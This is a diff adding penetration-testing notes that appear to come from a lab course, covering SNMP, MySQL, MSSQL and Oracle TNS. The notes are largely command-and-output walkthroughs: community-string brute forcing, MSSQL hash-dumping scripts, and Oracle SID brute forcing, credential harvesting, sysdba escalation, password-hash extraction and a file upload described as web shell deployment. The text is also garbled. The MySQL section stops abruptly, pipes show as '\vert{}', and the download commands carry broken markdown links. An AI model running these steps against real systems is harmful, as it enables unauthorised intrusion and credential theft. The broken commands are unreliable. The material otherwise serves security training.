@@ -1129,3 +1129,429 @@ openssl s_client -connect 10.129.14.128:993
 ```
 *Note:* Once connected, you can manually issue the IMAP or POP3 commands documented in Section 3 to navigate the mailbox, read sensitive correspondence, or retrieve target data.
 
+# Simple Network Management Protocol (SNMP) Architecture and Enumeration
+
+## 1. Introduction to SNMP
+Simple Network Management Protocol (SNMP) is an application-layer protocol utilized for monitoring and managing network devices. It enables administrators to handle configuration tasks, assess system health, and modify settings remotely. SNMP is universally supported across a wide array of hardware, including routers, switches, servers, and IoT devices.
+
+The protocol operates primarily over **UDP port 161** for polling operations (where the client actively queries the server or agents) and control commands. Additionally, SNMP employs **UDP port 162** to receive **traps**. Traps are asynchronous notifications sent from the SNMP agent to the management station without an explicit request, triggered by specific predefined system events. 
+
+To successfully exchange data, the available SNMP objects must have unique, mutually recognized addresses. This addressing mechanism is a fundamental prerequisite for effective network monitoring and management.
+
+## 2. Core Components
+
+### Management Information Base (MIB)
+To ensure interoperability across heterogeneous environments and different hardware vendors, SNMP utilizes the Management Information Base (MIB). The MIB is an independent, standardized text file formatted in Abstract Syntax Notation One (ASN.1). It organizes queryable SNMP objects into a hierarchical tree structure. While MIBs do not store actual operational data, they serve as a dictionary, defining where specific information resides, the corresponding data types, and access privileges.
+
+### Object Identifier (OID)
+An Object Identifier (OID) represents a specific node within the MIB's hierarchical namespace. Nodes are identified by a sequence of integers concatenated by dot notation (e.g., `.1.3.6.1.2.1.1`). The deeper the sequence traverses down the tree, the more granular the information becomes. Higher-level nodes often serve merely as structural references to subordinate nodes. Associated OIDs can be referenced in standard Object Identifier Registries.
+
+### Community Strings
+In legacy SNMP versions, community strings function as plaintext passwords governing access control. They determine whether a management station is authorized to view or modify queried information. Given their unencrypted nature, community strings represent a significant security vulnerability if intercepted via network sniffing.
+
+## 3. Protocol Versions
+
+* **SNMPv1:** The inaugural version of the protocol, primarily focused on basic network management and trap notifications. Its critical flaw is the complete lack of built-in authentication and encryption mechanisms; all data, including credentials, is transmitted in plaintext.
+* **SNMPv2c:** The most ubiquitous iteration in legacy environments. The "c" denotes its community-based authentication model. While it introduces performance enhancements over v1, it maintains the same fundamental security flaws, relying on plaintext community strings for access control.
+* **SNMPv3:** The modern standard, featuring robust security enhancements. It introduces User-based Security Model (USM) authentication (via username and password) and payload encryption (via pre-shared keys). However, this augmented security inherently increases configuration and deployment complexity compared to v2c.
+
+## 4. Service Configuration and Vulnerabilities
+
+### The SNMP Daemon Configuration
+The foundational settings for the SNMP service are defined within the daemon's configuration file, typically located at `/etc/snmp/snmpd.conf`. This file dictates listening IP addresses, ports, authorized MIBs, OIDs, and community strings.
+
+To inspect an active configuration (excluding comments and empty lines):
+
+    MikyRedHat@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
+
+    sysLocation    Sitting on the Dock of the Bay
+    sysContact     Me <me@example.org>
+    sysServices    72
+    master  agentx
+    agentaddress  127.0.0.1,[::1]
+    view   systemonly  included   .1.3.6.1.2.1.1
+    rocommunity  public default -V systemonly
+
+*Note: Security analysts and SysAdmins should actively configure and test SNMP daemons in isolated virtualized environments (Homelabs) to thoroughly understand the manpage directives.*
+
+### Dangerous Administrative Settings
+Misconfigurations within the daemon can lead to severe data exposure or unauthorized system modifications. Critical misconfigurations include:
+
+| Directive | Security Implication |
+| :--- | :--- |
+| `rwuser noauth` | Grants read-write access to the entire OID tree without requiring authentication. |
+| `rwcommunity <string> <IPv4>` | Grants full read-write access to the OID tree using a community string, often misconfigured to trust arbitrary source IPs. |
+| `rwcommunity6 <string> <IPv6>`| The IPv6 equivalent of `rwcommunity`, exposing the same unrestricted access risks. |
+
+## 5. Footprinting and Enumeration
+
+During the reconnaissance phase of a penetration test, identifying valid community strings and enumerating the OID tree can yield critical infrastructure intelligence, including kernel versions, installed software packages, routing tables, and active processes.
+
+### SNMPwalk
+`snmpwalk` automates SNMP GETNEXT requests to traverse and query the OID tree. Once a valid community string (e.g., "public") is identified, it extracts extensive system information.
+
+    MikyRedHat@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128
+
+    iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP"
+    iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
+    iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic"
+
+### OneSixtyOne
+`onesixtyone` is a high-speed SNMP scanner utilized to brute-force community strings. Administrators frequently map community strings to hostnames or internal naming conventions, making dictionary attacks highly effective when leveraging curated wordlists (e.g., SecLists).
+
+    MikyRedHat@htb[/htb]$ sudo apt install onesixtyone
+    MikyRedHat@htb[/htb]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
+
+    Scanning 1 hosts, 3220 communities
+    10.129.14.128 [public] Linux htb 5.11.0-37-generic
+
+### Braa
+Once a valid community string is compromised, `braa` acts as an ultra-fast mass SNMP scanner. It can recursively brute-force individual OIDs at high speeds to extract specific target data.
+
+    MikyRedHat@htb[/htb]$ sudo apt install braa
+    MikyRedHat@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*
+
+    10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic
+    10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
+
+    # MySQL: Architecture, Enumeration, and Security Auditing
+
+## 1. Overview and Architecture
+MySQL is a highly performant, open-source Relational Database Management System (RDBMS) currently backed by Oracle. It operates on a client-server architecture, comprising the MySQL server (the core database engine responsible for data storage, processing, and distribution) and multiple MySQL clients.
+
+Data is systematically organized into databases, containing tables comprised of columns, rows, and specific data types. Databases are commonly exported or backed up as standalone `.sql` files (e.g., `wordpress.sql`). MySQL is widely deployed in dynamic web application environments, frequently integrated into **LAMP** (Linux, Apache, MySQL, PHP) or **LEMP** (Linux, Nginx, MySQL, PHP) stacks. 
+
+### MariaDB Fork
+MariaDB is a popular, drop-in replacement fork of the original MySQL codebase. It was developed by the original MySQL founders following the Oracle acquisition to ensure an open-source alternative remained actively maintained.
+
+## 2. Client Interaction and Data Management
+MySQL clients interface with the database engine by transmitting Structured Query Language (SQL) statements. These queries handle data manipulation (inserting, deleting, modifying) and data retrieval. The service processes these queries and returns the requested data payloads (e.g., user credentials, application configurations, or dynamic content for a CMS like WordPress).
+
+> **Security Note:** While MySQL *can* store sensitive data such as passwords in plain text, standard security practices dictate that web applications (via PHP or other backend languages) must encrypt or hash these credentials (e.g., one-way hashing algorithms) prior to database insertion.
+
+## 3. Server Configuration and Security Posture
+Database administration requires meticulous configuration management. The primary configuration file on Linux environments is typically located at `/etc/mysql/mysql.conf.d/mysqld.cnf`.
+
+### Default Configuration Analysis
+```bash
+# Extracting active configurations (ignoring comments and empty lines)
+MikyRedHat@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf \vert{} grep -v "#" \vert{} sed -r '/^\s*$/d'
+
+[client]
+port        = 3306
+socket      = /var/run/mysqld/mysqld.sock
+
+[mysqld]
+user        = mysql
+pid-file    = /var/run/mysqld/mysqld.pid
+socket      = /var/run/mysqld/mysqld.sock
+port        = 3306
+basedir     = /usr
+datadir     = /var/lib/mysql
+tmpdir      = /tmp
+
+# Microsoft SQL Server (MSSQL): Architecture, Configuration, and Enumeration Methodology
+
+## 1. Technology Overview
+Microsoft SQL Server (MSSQL) is a proprietary, closed-source relational database management system (RDBMS) developed by Microsoft. Primarily designed to run on Windows operating systems, it boasts native integration with the .NET framework, making it the standard database solution for .NET applications. While cross-platform versions exist for Linux and macOS, penetration testers and systems administrators will predominantly encounter MSSQL instances within Windows environments.
+
+## 2. MSSQL Client Applications
+Administrators and developers utilize various client-side applications to interact with the SQL Database Engine. These clients can be installed locally on the administrator's workstation, meaning valid database credentials or active sessions may be extracted from compromised endpoints across the domain, not just the database server itself.
+
+**Common MSSQL Clients:**
+*   **SQL Server Management Studio (SSMS):** The standard GUI tool provided by Microsoft for initial configuration, deployment, and long-term database management.
+*   **Command-Line & Third-Party Tools:** `mssql-cli`, SQL Server PowerShell, HeidiSQL, and SQLPro.
+*   **Impacket's mssqlclient.py:** A highly effective Python-based client integrated into the SecureAuthCorp Impacket library. It is widely used in offensive security for remote authentication and query execution. 
+
+To locate the Impacket MSSQL client on a Linux-based attack host (e.g., Kali Linux):
+
+    MikyRedHat@htb[/htb]$ locate mssqlclient
+    /usr/bin/impacket-mssqlclient
+    /usr/share/doc/python3-impacket/examples/mssqlclient.py
+
+## 3. Default System Databases
+Understanding the default database structure is critical for footprinting a target server. MSSQL deploys with several standard system databases, each serving a specific administrative or structural purpose.
+
+| Database | System Function & Description |
+| :--- | :--- |
+| **master** | Tracks all system-level information, configurations, and metadata for the SQL Server instance. |
+| **model** | Serves as the structural template for all newly created databases. Modifications to `model` are inherited by any subsequent database deployments. |
+| **msdb** | Utilized by the SQL Server Agent for scheduling automated jobs, alerts, and backup procedures. |
+| **tempdb** | A temporary workspace that stores temporary objects, tables, and intermediate query results. |
+| **resource** | A read-only, hidden database containing all system objects deployed with the SQL Server instance. |
+
+## 4. Default Configurations and Security Risks
+By default, the SQL service executes under the `NT SERVICE\MSSQLSERVER` account. Network accessibility often relies on **Windows Authentication**, allowing the underlying OS to process login requests via the local SAM database or an Active Directory (AD) Domain Controller. 
+
+While AD integration centralizes auditing and Access Control Lists (ACLs), a compromised AD account can facilitate lateral movement and privilege escalation across the domain via the database instance.
+
+### Misconfiguration Vectors (IT Administrator Perspective)
+Due to operational pace and complex deployments, administrators may inadvertently introduce vulnerabilities. Critical misconfigurations to audit include:
+*   **Cleartext Authentication:** MSSQL clients connecting to the server without enforced encryption.
+*   **Cryptographic Flaws:** The utilization of self-signed certificates for encryption, which are vulnerable to spoofing and Man-in-the-Middle (MitM) attacks.
+*   **Protocol Risks:** Unrestricted enablement of Named Pipes over the network.
+*   **Default Credentials:** Failure to disable or secure the default `sa` (System Administrator) account, leaving it vulnerable to brute-force attacks.
+
+## 5. Service Footprinting and Enumeration
+Detailed enumeration of the MSSQL service (default TCP port `1433`) is required to map the attack surface. 
+
+### Method A: Nmap Scripting Engine (NSE)
+Executing targeted NSE scripts retrieves hostname, instance name, versioning, and determines if Named Pipes are active.
+
+    MikyRedHat@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
+
+    Starting Nmap 7.91 ( https://nmap.org )
+    PORT     STATE SERVICE  VERSION
+    1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+    | ms-sql-ntlm-info: 
+    |   Target_Name: SQL-01
+    |   NetBIOS_Domain_Name: SQL-01
+    |_  Product_Version: 10.0.17763
+    | ms-sql-info: 
+    |   Windows server name: SQL-01
+    |   10.129.201.248\MSSQLSERVER: 
+    |     Instance name: MSSQLSERVER
+    |     TCP port: 1433
+    |     Named pipe: \\10.129.201.248\pipe\sql\query
+
+### Method B: Metasploit Framework Auxiliary Modules
+The `mssql_ping` module provides rapid asset discovery and instance metadata extraction.
+
+    msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
+    msf6 auxiliary(scanner/mssql/mssql_ping) > run
+
+    [*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
+    [+] 10.129.201.248:       -    ServerName      = SQL-01
+    [+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
+    [+] 10.129.201.248:       -    Version         = 15.0.2000.5
+    [+] 10.129.201.248:       -    tcp             = 1433
+    [+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
+
+## 6. Remote Interaction (Impacket)
+Upon acquiring valid credentials, `mssqlclient.py` enables direct interaction with the SQL Database Engine using T-SQL (Transact-SQL). The `-windows-auth` flag explicitly forces NTLM/Kerberos authentication.
+
+    MikyRedHat@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+    
+    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+    Password:
+    [*] Encryption required, switching to TLS
+    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+    [*] INFO(SQL-01): Line 1: Changed database context to 'master'.
+    
+    SQL> select name from sys.databases
+    
+    name                                                                                                                             
+    --------------------------------------------------------------------------------------
+    master                                                                                                                           
+    tempdb                                                                                                                           
+    model                                                                                                                            
+    msdb                                                                                                                             
+    Transactions
+
+    # Oracle TNS (Transparent Network Substrate) Enumeration & Exploitation
+
+## Overview
+The Oracle Transparent Network Substrate (TNS) is a proprietary communication protocol designed to facilitate secure and efficient interaction between Oracle databases and client applications over networks. Originally introduced as a core component of the Oracle Net Services suite, TNS supports multiple networking protocols, including IPX/SPX and TCP/IP stacks. Its robust architecture—featuring built-in encryption, load balancing, and fault tolerance—makes it an industry standard for managing complex databases in highly regulated sectors such as healthcare and finance.
+
+Modern iterations of TNS have been upgraded to support IPv6 and SSL/TLS encryption. This ensures data integrity and protects against unauthorized interception across the network layer. Additionally, the service provides advanced administrative capabilities, including performance monitoring, workload management, and comprehensive error logging.
+
+## Default Configuration and Architecture
+The default configuration of the Oracle TNS server varies depending on the specific version and edition of the Oracle software. However, fundamental settings remain consistent across deployments:
+*   **Default Port:** The listener operates on `TCP/1521` by default, though this can be modified during installation or via configuration files.
+*   **Protocol Support:** Configured to support a wide array of network protocols (TCP/IP, UDP, IPX/SPX, AppleTalk) across multiple network interfaces.
+*   **Management Constraints:** Remote management is permitted by default in Oracle 8i/9i but restricted in Oracle 10g/11g.
+
+### Core Configuration Files
+TNS configuration relies heavily on two plaintext files typically located in the `$ORACLE_HOME/network/admin` directory:
+
+#### 1. `tnsnames.ora` (Client-Side)
+This file is used by client applications to resolve service names to network addresses. Each database or service requires a unique entry containing the service name, network location, and connection parameters.
+
+```text
+ORCL =
+  (DESCRIPTION =
+    (ADDRESS_LIST =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    )
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+```
+
+#### 2. `listener.ora` (Server-Side)
+This configuration file defines the listener process's properties and parameters. The listener is responsible for receiving incoming client requests and routing them to the appropriate database instance.
+
+```text
+SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = PDB1)
+      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+      (GLOBAL_DBNAME = PDB1)
+      (SID_DIRECTORY_LIST =
+        (SID_DIRECTORY =
+          (DIRECTORY_TYPE = TNS_ADMIN)
+          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
+        )
+      )
+    )
+  )
+
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+ADR_BASE_LISTENER = C:\oracle
+```
+
+### Connection Attributes Reference
+
+| Setting | Description |
+| :--- | :--- |
+| **DESCRIPTION** | A descriptor providing the database name and connection type. |
+| **ADDRESS** | The network address of the database (hostname and port number). |
+| **PROTOCOL** | The network protocol utilized for server communication. |
+| **PORT** | The specific port number for communication (Default: 1521). |
+| **CONNECT_DATA** | Connection attributes, including service name/SID, protocol, and instance identifier. |
+| **INSTANCE_NAME** | The target database instance identifier. |
+| **SERVICE_NAME** | The specific service the client intends to connect to. |
+| **SERVER** | The connection architecture type (e.g., dedicated or shared). |
+| **USER / PASSWORD** | Authentication credentials for the database server. |
+| **SECURITY** | The security protocol designated for the connection. |
+| **VALIDATE_CERT** | Boolean flag to validate the SSL/TLS certificate. |
+| **SSL_VERSION** | The designated SSL/TLS version for the connection. |
+| **CONNECT_TIMEOUT** | Client timeout limit (in seconds) to establish a connection. |
+
+*Note: Database administrators often deploy a `PlsqlExclusionList` (placed in `$ORACLE_HOME/sqldeveloper`) to serve as a blacklist, preventing the execution of specific PL/SQL packages via the Oracle Application Server.*
+
+---
+
+## Environment Setup for Penetration Testing
+Before engaging with the TNS listener, specific toolsets must be deployed. We will configure **ODAT** (Oracle Database Attacking Tool) and **SQL*Plus**.
+
+### 1. Installing ODAT
+ODAT is an open-source framework developed in Python, engineered to enumerate and exploit vulnerabilities (SQLi, RCE, Privilege Escalation) within Oracle databases.
+
+```bash
+# Update repositories and install dependencies
+sudo apt-get update
+sudo apt-get install -y build-essential python3-dev libaio1 python3-scapy libgmp-dev
+
+# Install cx_Oracle
+cd ~
+wget [https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz](https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz)
+tar xzf cx_Oracle-8.3.0.tar.gz
+cd cx_Oracle-8.3.0
+python3 setup.py build
+sudo python3 setup.py install
+
+# Clone and build ODAT
+cd ~
+git clone [https://github.com/quentinhardy/odat.git](https://github.com/quentinhardy/odat.git)
+cd odat/
+git submodule init
+git submodule update
+
+# Install Python modules
+sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome openpyxl
+
+# Verify ODAT installation
+./odat.py -h
+```
+
+### 2. Installing SQL*Plus
+SQL*Plus is Oracle's standard command-line utility for database interaction.
+
+```bash
+sudo apt update
+sudo apt upgrade parrot-core
+sudo apt install oracle-instantclient-sqlplus
+
+# Troubleshooting missing shared libraries (if required):
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
+sudo ldconfig
+
+# Verify SQL*Plus installation
+sqlplus -v
+```
+
+---
+
+## Enumeration and Exploitation Workflow
+
+### 1. Port Scanning and Service Detection
+Identify active Oracle TNS instances using Nmap.
+
+```bash
+sudo nmap -p1521 -sV 10.129.204.235 --open
+```
+
+### 2. SID Enumeration (Bruteforcing)
+A System Identifier (SID) uniquely identifies a database instance. If a client provides an invalid SID, the connection drops. We can bruteforce the SID using Nmap scripts.
+
+```bash
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+```
+*(Expected Output: Identified SID, e.g., `XE`)*
+
+### 3. Credential Harvesting with ODAT
+Execute a comprehensive scan against the target to identify valid credentials, locked accounts, and potential vulnerabilities.
+
+```bash
+./odat.py all -s 10.129.204.235
+```
+*(Example finding: `[+] Valid credentials found: scott/tiger`)*
+
+### 4. Database Interaction via SQL*Plus
+Authenticate to the database using the compromised credentials and the discovered SID.
+
+```bash
+sqlplus scott/tiger@10.129.204.235/XE
+```
+
+Once connected, enumerate current privileges and available tables:
+```sql
+SQL> select table_name from all_tables;
+SQL> select * from user_role_privs;
+```
+
+### 5. Privilege Escalation (SYSDBA)
+If the compromised account possesses administrative rights, attempt to escalate privileges to System Database Admin (`sysdba`).
+
+```bash
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+
+Verify the elevated privileges:
+```sql
+SQL> select * from user_role_privs;
+```
+
+### 6. Post-Exploitation: Credential Extraction
+With `sysdba` access, extract password hashes directly from the `sys.user$` table for offline cracking.
+
+```sql
+SQL> select name, password from sys.user$;
+```
+
+### 7. Post-Exploitation: File Upload (Web Shell Deployment)
+If the target infrastructure hosts a web server, we can leverage ODAT's `utlfile` module to upload files (e.g., a web shell) to standard web directories (`/var/www/html` for Linux, `C:\inetpub\wwwroot` for Windows).
+
+```bash
+# Create a payload file
+echo "Oracle File Upload Test" > testing.txt
+
+# Upload via ODAT
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+
+Verify the successful upload via a standard HTTP GET request:
+```bash
+curl -X GET [http://10.129.204.235/testing.txt](http://10.129.204.235/testing.txt)
+```
